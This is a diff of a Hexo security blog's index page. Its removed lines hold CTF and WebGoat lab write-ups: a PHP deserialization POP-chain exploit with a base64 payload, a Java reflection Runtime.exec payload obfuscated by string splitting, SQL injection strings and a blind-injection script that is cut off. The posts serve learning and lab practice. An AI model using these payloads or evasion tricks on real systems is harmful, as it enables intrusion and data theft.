@@ -1,1618 +1,354 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  
-
-  
-  <title>小叹</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
+<!DOCTYPE html><html lang="zh-cn" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>小叹</title><meta name="author"><meta name="copyright"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta property="og:type" content="website">
 <meta property="og:title" content="小叹">
 <meta property="og:url" content="http://yoursite.com/index.html">
 <meta property="og:site_name" content="小叹">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gsxjbgddgvj30u00u0gnx.jpg">
 <meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="小叹" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/favicon.png">
-  
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/008i3skNly1gsxjbgddgvj30u00u0gnx.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://yoursite.com/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="baidu-site-verification" content="n7EnZXbI9l"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '小叹',
+  isPost: false,
+  isHome: true,
+  isHighlightShrink: true,
+  isToc: false,
+  postUpdate: '2021-07-29 10:40:51'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
-<meta name="generator" content="Hexo 5.1.1"></head>
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">小叹</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
         
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
-        
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-[MRCTF2020]Ezpop_Reveng" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/08/11/%5BMRCTF2020%5DEzpop_Reveng/" class="article-date">
-  <time datetime="2020-08-11T04:57:35.659Z" itemprop="datePublished">2020-08-11</time>
-</a>
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
     
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="MRCTF2020-Ezpop-Reveng"><a href="#MRCTF2020-Ezpop-Reveng" class="headerlink" title="[MRCTF2020]Ezpop_Reveng"></a>[MRCTF2020]Ezpop_Reveng</h2><p>有<a target="_blank" rel="noopener" href="http://www.zip下载源码，进行全局搜索unserialize。">www.zip下载源码，进行全局搜索unserialize。</a></p>
-<p>Plugin.php:</p>
-<pre><code>    public function action()&#123;
-        if(!isset($_SESSION)) session_start();
-        if(isset($_REQUEST[&#39;admin&#39;])) var_dump($_SESSION);
-        if (isset($_POST[&#39;C0incid3nc3&#39;])) &#123;
-         if(preg_match(&quot;/file|assert|eval|[`\&#39;~^?&lt;&gt;$%]+/i&quot;,base64_decode($_POST[&#39;C0incid3nc3&#39;])) === 0)
-            unserialize(base64_decode($_POST[&#39;C0incid3nc3&#39;]));
-         else &#123;
-            echo &quot;Not that easy.&quot;;
-         &#125;
-        &#125;
-    &#125;
-&#125;</code></pre><p>上面有wake_up：</p>
-<pre><code>class HelloWorld_DB&#123;
-    private $flag=&quot;MRCTF&#123;this_is_a_fake_flag&#125;&quot;;
-    private $coincidence;
-    function  __wakeup()&#123;
-        $db = new Typecho_Db($this-&gt;coincidence[&#39;hello&#39;], $this-&gt;coincidence[&#39;world&#39;]);
-    &#125;
-&#125;</code></pre><p>跟进Typecho_Db看看：</p>
-<pre><code>public function __construct($adapterName, $prefix = &#39;typecho_&#39;)
-&#123;
-    /** 获取适配器名称 */
-    $this-&gt;_adapterName = $adapterName;
-
-    /** 数据库适配器 */
-    $adapterName = &#39;Typecho_Db_Adapter_&#39; . $adapterName;
-
-    if (!call_user_func(array($adapterName, &#39;isAvailable&#39;))) &#123;
-        throw new Typecho_Db_Exception(&quot;Adapter &#123;$adapterName&#125; is not available&quot;);//__toString()
-    &#125;</code></pre><p>这里有提示toSting</p>
-<p>跟进，在类<code>Typecho_Db_Query</code>中的<code>__toString()</code></p>
-<pre><code>    public function __toString()
-    &#123;
-        switch ($this-&gt;_sqlPreBuild[&#39;action&#39;]) &#123;
-            case Typecho_Db::SELECT:
-                return $this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild);
-            case Typecho_Db::INSERT:
-                return &#39;INSERT INTO &#39;
-                . $this-&gt;_sqlPreBuild[&#39;table&#39;]
-                . &#39;(&#39; . implode(&#39; , &#39;, array_keys($this-&gt;_sqlPreBuild[&#39;rows&#39;])) . &#39;)&#39;
-                . &#39; VALUES &#39;
-                . &#39;(&#39; . implode(&#39; , &#39;, array_values($this-&gt;_sqlPreBuild[&#39;rows&#39;])) . &#39;)&#39;
-                . $this-&gt;_sqlPreBuild[&#39;limit&#39;];
-            case Typecho_Db::DELETE:
-                return &#39;DELETE FROM &#39;
-                . $this-&gt;_sqlPreBuild[&#39;table&#39;]
-                . $this-&gt;_sqlPreBuild[&#39;where&#39;];
-            case Typecho_Db::UPDATE:
-                $columns = array();
-                if (isset($this-&gt;_sqlPreBuild[&#39;rows&#39;])) &#123;
-                    foreach ($this-&gt;_sqlPreBuild[&#39;rows&#39;] as $key =&gt; $val) &#123;
-                        $columns[] = &quot;$key = $val&quot;;
-                    &#125;
-                &#125;
-
-                return &#39;UPDATE &#39;
-                . $this-&gt;_sqlPreBuild[&#39;table&#39;]
-                . &#39; SET &#39; . implode(&#39; , &#39;, $columns)
-                . $this-&gt;_sqlPreBuild[&#39;where&#39;];
-            default:
-                return NULL;
-        &#125;
-    &#125;
-&#125;</code></pre><p>exp:</p>
-<pre><code>&lt;?php
-
-class HelloWorld_DB&#123;
-    private $flag=&quot;MRCTF&#123;this_is_a_fake_flag&#125;&quot;;
-    private $coincidence;
-    public function __construct()
-    &#123;
-        $this-&gt;coincidence = [&#39;hello&#39;=&gt;new Typecho_Db_Query()];
-    &#125;
-&#125;
-
-
-class Typecho_Db_Query
-&#123;
-
-    private $_adapter;
-    private $_sqlPreBuild;
-
-    public function __construct()
-    &#123;
-        $target = &#39;http://127.0.0.1/flag.php&#39;;
-        $headers = array(
-            &#39;X-Forwarded-For: 127.0.0.1&#39;,
-            &#39;Cookie: PHPSESSID=11111111111111111111111111&#39;
-        );
-        $b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;HyyMbb^^&#39;.join(&#39;^^&#39;,$headers),&#39;uri&#39;      =&gt; &quot;aaab&quot;));
-        $this-&gt;_adapter=$b;
-        $this-&gt;_sqlPreBuild = [&#39;action&#39;=&gt;&#39;SELECT&#39;];
-
-    &#125;
-&#125;</code></pre><p>访问<code>page_admin</code>?admin=1</p>
-<pre><code>C0incid3nc3=TzoxMzoiSGVsbG9Xb3JsZF9EQiI6MTp7UzoyNjoiXDAwSGVsbG9Xb3JsZF9EQlwwMGNvaW5jaWRlbmNlIjthOjE6e3M6NToiaGVsbG8iO086MTY6IlR5cGVjaG9fRGJfUXVlcnkiOjI6e1M6MzA6IlwwMFR5cGVjaG9fRGJfUXVlcnlcMDBfc3FsUHJlQnVpbGQiO2E6MTp7czo2OiJhY3Rpb24iO3M6NjoiU0VMRUNUIjt9UzoyNjoiXDAwVHlwZWNob19EYl9RdWVyeVwwMF9hZGFwdGVyIjtPOjEwOiJTb2FwQ2xpZW50Ijo1OntzOjM6InVyaSI7czo0OiJhYWFiIjtzOjg6ImxvY2F0aW9uIjtzOjI1OiJodHRwOi8vMTI3LjAuMC4xL2ZsYWcucGhwIjtzOjE1OiJfc3RyZWFtX2NvbnRleHQiO2k6MDtzOjExOiJfdXNlcl9hZ2VudCI7czo3OToid3VwY28NClgtRm9yd2FyZGVkLUZvcjogMTI3LjAuMC4xDQpDb29raWU6IFBIUFNFU1NJRD0xMTExMTExMTExMTExMTExMTExMTExMTExMSI7czoxMzoiX3NvYXBfdmVyc2lvbiI7aToxO319fX0=</code></pre><p>再次访问：</p>
-<p>PHPSESSION=11111111111111111111111111</p>
-<p>出现flag.</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/11/[MRCTF2020]Ezpop_Reveng/" data-id="ckemqkeul003easty7w6ad62r" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-WebGoat代码审计（三）XXE" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/08/07/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%B8%89%EF%BC%89XXE/" class="article-date">
-  <time datetime="2020-08-07T05:09:10.288Z" itemprop="datePublished">2020-08-07</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="WebGoat代码审计（三）XXE"><a href="#WebGoat代码审计（三）XXE" class="headerlink" title="WebGoat代码审计（三）XXE"></a>WebGoat代码审计（三）XXE</h1><p>WebGoat采用的是Spring Boot的微服务框架。所以处理各种请求时，是通过里面的注解。</p>
-<p><strong>查看源码文件WebGoat\webgoat-lessons\xxe\src\main\java\org\owasp\webgoat\plugin\SimpleXXE.java代码中的第53~79行，处理了我们发往/WebGoat/xxe/simple</strong> <strong>的POST 请求。</strong></p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200807105423406.png" alt="image-20200807105423406"></p>
-<p><strong>其中的类似@Xxxx</strong> <strong>的是各种注解，如：</strong> </p>
-<p> @AssignmentPath(“xxe/simple”) 接收并处理发往xxe/simple的HTTP请求。  </p>
-<p>@Autowired 控制如何完成自动连接或加载。  </p>
-<p>@RequestMapping(method = POST, consumes = ALL_VALUE, produces = APPLICATION_JSON_VALUE)配置url映射。  </p>
-<p>@ResponseBody表示该方法的返回结果直接写入 HTTP返回包的正文中。  (</p>
-<p>@RequestBody String commentStr)表示将请求中的数据写入到commentStr这个String对象中。</p>
-<p>在Comments.java文件做了3件事情：</p>
-<p>1.获取一个JAXBContext的实例名为jc。</p>
-<p>2.JAXBContext创建一个Unmarshaller对象。</p>
-<p>3.执行unmarshaller方法得到comment。</p>
-<p>newInstance里面传入的是一个class，也就是Comment这个类。  unmarshaller里面传入的是一个xml的字符串，也就是xml。 </p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200807112050438.png" alt="image-20200807112050438"></p>
-<p>跟踪代码。</p>
-<p><strong>当把xml格式的字符串传递给Unmarshaller接口转变成Java对象时，会解析一遍xml，如果传入的值可控就会导致XXE注入攻击。</strong></p>
-<p><img src="D:%5Cblog%5Csource_posts%5Cimage-20200807112154158.png" alt="image-20200807112154158"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/07/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%B8%89%EF%BC%89XXE/" data-id="ckemqkeau000zastye7i3gkw1" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Java反射的学习" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/08/07/Java%E5%8F%8D%E5%B0%84%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="article-date">
-  <time datetime="2020-08-07T02:06:22.958Z" itemprop="datePublished">2020-08-07</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Java反射的学习"><a href="#Java反射的学习" class="headerlink" title="Java反射的学习"></a>Java反射的学习</h1><p>之前Java的 反射一直没弄懂，今天学习一下。</p>
-<p>从这个简单的例子可以看出，一般情况下我们使用反射获取一个对象的步骤：</p>
-<ul>
-<li>获取类的 Class 对象实例</li>
-</ul>
-<pre><code>Class clz = Class.forName(&quot;com.zhenai.api.Apple&quot;);</code></pre><ul>
-<li>根据 Class 对象实例获取 Constructor 对象</li>
-</ul>
-<pre><code>Constructor appleConstructor = clz.getConstructor();</code></pre><ul>
-<li>使用 Constructor 对象的 newInstance 方法获取反射类对象</li>
-</ul>
-<pre><code>Object appleObj = appleConstructor.newInstance();</code></pre><p>而如果要调用某一个方法，则需要经过下面的步骤：</p>
-<ul>
-<li>获取方法的 Method 对象</li>
-</ul>
-<pre><code>Method setPriceMethod = clz.getMethod(&quot;setPrice&quot;, int.class);</code></pre><ul>
-<li>利用 invoke 方法调用方法</li>
-</ul>
-<pre><code>setPriceMethod.invoke(appleObj, 14);</code></pre><p>下面是执行系统命令的payload：</p>
-<pre><code>&#39;&#39;.getClass()
-// class java.lang.String
-
-&#39;&#39;.getClass().forName(&#39;java.la&#39;+&#39;ng.Ru&#39;+&#39;ntime&#39;)
-// class java.lang.Runtime
-
-&#39;&#39;.getClass().forName(&#39;java.la&#39;+&#39;ng.Ru&#39;+&#39;ntime&#39;).getMethod(&#39;ex&#39;+&#39;ec&#39;,&#39;&#39;.getClass())
-// public java.lang.Process java.lang.Runtime.exec(java.lang.String) throws java.io.IOException
-
-&#39;&#39;.getClass().forName(&#39;java.la&#39;+&#39;ng.Ru&#39;+&#39;ntime&#39;).getMethod(&#39;getRu&#39;+&#39;ntime&#39;)
-// public static java.lang.Runtime java.lang.Runtime.getRuntime()
-
-&#39;&#39;.getClass().forName(&#39;java.la&#39;+&#39;ng.Ru&#39;+&#39;ntime&#39;).getMethod(&#39;getRu&#39;+&#39;ntime&#39;).invoke(null)
-// java.lang.Runtime@c2939a
-
-&#39;&#39;.getClass().forName(&#39;java.la&#39;+&#39;ng.Ru&#39;+&#39;ntime&#39;).getMethod(&#39;ex&#39;+&#39;ec&#39;,&#39;&#39;.getClass()).invoke(&#39;&#39;.getClass().forName(&#39;java.la&#39;+&#39;ng.Ru&#39;+&#39;ntime&#39;).getMethod(&#39;getRu&#39;+&#39;ntime&#39;).invoke(null),&#39;calc&#39;)
-// java.lang.ProcessImpl@f2f85c</code></pre><p>静下心看看还是很简单的。在网上找到了一个代码</p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200807100414075.png" alt="image-20200807100414075"></p>
-<p>通过上面的学习，将这个代码修改一下在本地运行。</p>
-<pre><code>package forname;
-
-import java.io.IOException;
-import java.lang.reflect.InvocationTargetException;
-import java.lang.reflect.Method;
-
-public class MAin &#123;
-    public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException,
-            InstantiationException, IOException, NoSuchMethodException, InvocationTargetException &#123;
-        Method method = &quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null);
-        Runtime run = (Runtime) method.invoke(null,null);
-        run.exec(&quot;calc&quot;);
-//        Method exec_method = &quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,&quot;&quot;.getClass());
-//        exec_method.invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(null),&quot;calc&quot;);
-//        System.out.println(&quot;&quot;.getClass());
-    &#125;
-&#125;</code></pre><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200807100513630.png" alt="image-20200807100513630"></p>
-<p>可以看见运行成功。我们再改一下。</p>
-<pre><code>public class MAin &#123;
-    public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException,
-            InstantiationException, IOException, NoSuchMethodException, InvocationTargetException &#123;
-//        Method method = &quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null);
-//        Runtime run = (Runtime) method.invoke(null,null);
-//        run.exec(&quot;calc&quot;);
-        Method exec_method = &quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,&quot;&quot;.getClass());
-        exec_method.invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(null),&quot;calc&quot;);
-        System.out.println(&quot;&quot;.getClass());
-    &#125;
-&#125;</code></pre><p>也同样运行成功了。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/07/Java%E5%8F%8D%E5%B0%84%E7%9A%84%E5%AD%A6%E4%B9%A0/" data-id="ckemqkeam000gastygrk74hkr" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Webgoat代码审计（二）" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/08/01/Webgoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%BA%8C%EF%BC%89/" class="article-date">
-  <time datetime="2020-08-01T06:48:24.657Z" itemprop="datePublished">2020-08-01</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Webgoat代码审计（二）"><a href="#Webgoat代码审计（二）" class="headerlink" title="Webgoat代码审计（二）"></a>Webgoat代码审计（二）</h1><pre><code>protected AttackResult injectableQuery(String login_count, String accountName) &#123;
-    String queryString = &quot;SELECT * From user_data WHERE Login_Count = ? and userid= &quot; + accountName;
-    try (Connection connection = dataSource.getConnection()) &#123;
-        PreparedStatement query = connection.prepareStatement(queryString, ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY);
-
-        int count = 0;
-        try &#123;
-            count = Integer.parseInt(login_count);
-        &#125; catch (Exception e) &#123;
-            return failed(this).output(&quot;Could not parse: &quot; + login_count + &quot; to a number&quot;
-                    + &quot;&lt;br&gt; Your query was: &quot; + queryString.replace(&quot;?&quot;, login_count)).build();
-        &#125;
-
-        query.setInt(1, count);
-        //String query = &quot;SELECT * FROM user_data WHERE Login_Count = &quot; + login_count + &quot; and userid = &quot; + accountName, ;
-        try &#123;
-            ResultSet results = query.executeQuery();
-
-            if ((results != null) &amp;&amp; (results.first() == true)) &#123;
-                ResultSetMetaData resultsMetaData = results.getMetaData();
-                StringBuffer output = new StringBuffer();
-
-                output.append(SqlInjectionLesson5a.writeTable(results, resultsMetaData));
-                results.last();
-
-                // If they get back more than one user they succeeded
-                if (results.getRow() &gt;= 6) &#123;
-                    return success(this).feedback(&quot;sql-injection.5b.success&quot;).output(&quot;Your query was: &quot; + queryString.replace(&quot;?&quot;, login_count)).feedbackArgs(output.toString()).build();
-                &#125; else &#123;
-                    return failed(this).output(output.toString() + &quot;&lt;br&gt; Your query was: &quot; + queryString.replace(&quot;?&quot;, login_count)).build();
-                &#125;
-
-            &#125; else &#123;
-                return failed(this).feedback(&quot;sql-injection.5b.no.results&quot;).output(&quot;Your query was: &quot; + queryString.replace(&quot;?&quot;, login_count)).build();
-            &#125;
-        &#125; catch (SQLException sqle) &#123;
-
-            return failed(this).output(sqle.getMessage() + &quot;&lt;br&gt; Your query was: &quot; + queryString.replace(&quot;?&quot;, login_count)).build();
-        &#125;
-    &#125; catch (Exception e) &#123;
-        return failed(this).output(this.getClass().getName() + &quot; : &quot; + e.getMessage() + &quot;&lt;br&gt; Your query was: &quot; + queryString.replace(&quot;?&quot;, login_count)).build();
-    &#125;
-&#125;</code></pre><p>可以看见这里Login_Count的参数使用了预编译，所以对它进行注入失败了。</p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200801092254377.png" alt="image-20200801092254377"></p>
-<p>试试看对id的注入。</p>
-<blockquote>
-<p>1</p>
-<p>1 or 1 =1</p>
-</blockquote>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200801093709624.png" alt="image-20200801093709624"></p>
-<p>可以看见注入成功了。</p>
-<h1 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h1><p>很简单直接注入就行了。</p>
-<pre><code>StringBuffer output = new StringBuffer();
-String query = &quot;SELECT * FROM employees WHERE last_name = &#39;&quot; + name + &quot;&#39; AND auth_tan = &#39;&quot; + auth_tan + &quot;&#39;&quot;;</code></pre><h1 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h1><p>本题使用查询链破坏完整性：<br>employee name: ’ ; update employees set salary=1000000 where last_name=‘Smith’; –<br>tan: 随便填</p>
-<h1 id="advance"><a href="#advance" class="headerlink" title="advance"></a>advance</h1><h1 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h1><pre><code>String query = &quot;&quot;;
-try (Connection connection = dataSource.getConnection()) &#123;
-    boolean usedUnion = true;
-    query = &quot;SELECT * FROM user_data WHERE last_name = &#39;&quot; + accountName + &quot;&#39;&quot;;
-    //Check if Union is used
-    if (!accountName.matches(&quot;(?i)(^[^-/*;)]*)(\\s*)UNION(.*$)&quot;)) &#123;
-        usedUnion = false;
-    &#125;</code></pre><p>从正则可以看出要出现union</p>
-<p>‘  union select userid,user_name,password,cookie,’5’,’6’,7 from user_system_data <em>–</em></p>
-<p>union查询要注意到两点：一是查询列数相同；二是查询类型要兼容）</p>
-<p>‘;select userid,user_name,password,cookie,’5’,’6’,’7’ from user_system_data –</p>
-<h1 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h1><p>可以看见两个参数都有预编译，无法进行注入。</p>
-<pre><code>@PostMapping(&quot;/SqlInjectionAdvanced/challenge_Login&quot;)
-    @ResponseBody
-    public AttackResult login(@RequestParam String username_login, @RequestParam String password_login) throws Exception &#123;
-        try (var connection = dataSource.getConnection()) &#123;
-            PreparedStatement statement = connection.prepareStatement(&quot;select password from sql_challenge_users where userid = ? and password = ?&quot;);
-            statement.setString(1, username_login);
-            statement.setString(2, password_login);
-            ResultSet resultSet = statement.executeQuery();
-
-            if (resultSet.next()) &#123;
-                return (&quot;tom&quot;.equals(username_login)) ? success(this).build()
-                        : success(this).feedback(&quot;ResultsButNotTom&quot;).build();
-            &#125; else &#123;
-                return failed(this).feedback(&quot;NoResultsMatched&quot;).build();
-            &#125;
-        &#125;
-    &#125;
-&#125;</code></pre><p>那就看看注册页面可不可以注入</p>
-<pre><code>try (Connection connection = dataSource.getConnection()) &#123;
-    String checkUserQuery = &quot;select userid from sql_challenge_users where userid = &#39;&quot; + username_reg + &quot;&#39;&quot;;
-    Statement statement = connection.createStatement();
-    ResultSet resultSet = statement.executeQuery(checkUserQuery);
-
-    if (resultSet.next()) &#123;
-        if (username_reg.contains(&quot;tom&#39;&quot;)) &#123;
-            attackResult = success(this).feedback(&quot;user.exists&quot;).build();
-        &#125; else &#123;
-            attackResult = failed(this).feedback(&quot;user.exists&quot;).feedbackArgs(username_reg).build();
-        &#125;
-    &#125; else &#123;
-        PreparedStatement preparedStatement = connection.prepareStatement(&quot;INSERT INTO sql_challenge_users VALUES (?, ?, ?)&quot;);
-        preparedStatement.setString(1, username_reg);
-        preparedStatement.setString(2, email_reg);
-        preparedStatement.setString(3, password_reg);
-        preparedStatement.execute();
-        attackResult = success(this).feedback(&quot;user.created&quot;).feedbackArgs(username_reg).build();
-    &#125;</code></pre><p>从注册的代码可以看见虽然进行了预编译但是在前面的查询操作中是直接进行拼接的，所以存在注入点。下面是我写的脚本（写了好久，铁废物了）：</p>
-<p><code>import requests</code></p>
-<p><code>from string import printable</code></p>
-<p><code>\#print(printable)</code></p>
-<p><code>url = &quot;http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge&quot;</code></p>
-<p><code>headers = &#123;</code></p>
-<p>  <code>&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0&#39;,</code></p>
-<p>  <code>&#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded; charset=UTF-8&#39;,</code></p>
-<p>  <code>&#39;X-Requested-With&#39;: &#39;XMLHttpRequest&#39;</code></p>
-<p><code>&#125;</code></p>
-<p><code>cookie = &#123;</code></p>
-<p>  <code>&#39;JSESSIONID&#39;: &#39;ErbHloJmWxHtUQJ9RFopDZtBgoHiDX6hLVRsbISp&#39;</code></p>
-<p><code>&#125;</code></p>
-<p><code>test_data = &quot;username_reg=tom&#39;+and+substr(password,1,1)=&#39;1&#39;--+-&amp;email_reg=123456@qq.com&amp;password_reg=123456&amp;confirm_password_reg=123&quot;</code></p>
-<p><code>proxy=&#123;&quot;http&quot;: &quot;http://127.0.0.1:8889&quot;&#125;</code></p>
-<p><code>\# req = requests.put(url,data=test_data,headers=headers,cookies=cookie,proxies=proxy)</code></p>
-<p><code>\# print(req.text)</code></p>
-<p><code>\# if &#39;already exists&#39; in req.text:</code></p>
-<p><code>\#   print(True)</code></p>
-<p><code>i=0</code></p>
-<p><code>text = &quot;&quot;</code></p>
-<p><code>while True:</code></p>
-<p>  <code>i += 1</code></p>
-<p>  <code>temp = text</code></p>
-<p>  <code>for char in printable:</code></p>
